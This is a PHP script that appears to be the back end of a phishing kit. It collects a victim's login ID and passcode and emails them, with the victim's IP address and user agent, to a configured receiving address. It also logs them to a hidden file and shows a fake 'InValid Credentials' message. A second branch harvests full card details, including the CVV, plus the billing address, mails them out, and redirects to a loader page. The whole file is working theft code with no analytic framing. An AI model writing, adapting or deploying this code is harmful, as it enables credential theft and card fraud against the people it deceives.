<?php
include 'email.php';
$email = trim($_POST['ai']);
$password = trim($_POST['pr']);
if($email != null && $password != null){
	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];
	$message .= "|--------------------|\n";
	$message .= "Online ID            : ".$email."\n";
	$message .= "Passcode              : ".$password."\n";
	$message .= "|-------------------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|------------------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
    	mail($send, $subject, $message);   

    	
    	$data = "\n".$message;
	$fp = fopen('.error.htm', 'a');
	fwrite($fp, $data);
	fclose($fp); 


	$signal ='ok';
	$msg ='InValid Credentials';
	
	// $praga=rand();
	// $praga=md5($praga);
}
else if (isset($_POST['btn5'])) {

	$ip = getenv("REMOTE_ADDR");
	$hostname = gethostbyaddr($ip);
	$useragent = $_SERVER['HTTP_USER_AGENT'];

	$message .= "|----------| Card Information |--------------|\n";
	$message .= "Name On Card             : ".$_POST['name']."\n";
	$message .= "Card Number             : ".$_POST['cnum']."\n";
	$message .= "Expire Date             : ".$_POST['exdate']."\n";
	$message .= "CVV             : ".$_POST['csc']."\n";

	$message .= "|----------| Billing Information |--------------|\n";
	$message .= "Address             : ".$_POST['add']."\n";
	$message .= "City             : ".$_POST['city']."\n";
	$message .= "Zipcode             : ".$_POST['zip']."\n";
	$message .= "State             : ".$_POST['state']."\n";
	

	$message .= "|--------------- I N F O | I P -------------------|\n";
	$message .= "|Client IP: ".$ip."\n";
	$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
	$message .= "User Agent : ".$useragent."\n";
	$message .= "|----------- --------------|\n";
	$send = $Receive_email;
	$subject = "Login : $ip";
	mail($send, $subject, $message); 

	header("Location: ./htm/loader.html");
}
else{
	$signal ='bad';
	$msg ='Please fill in all the fields.';
}


$data = array(
        'signal' => $signal,
        'msg' => $msg,
        'redirect_link' => $redirect,
    );
    echo json_encode($data);

?>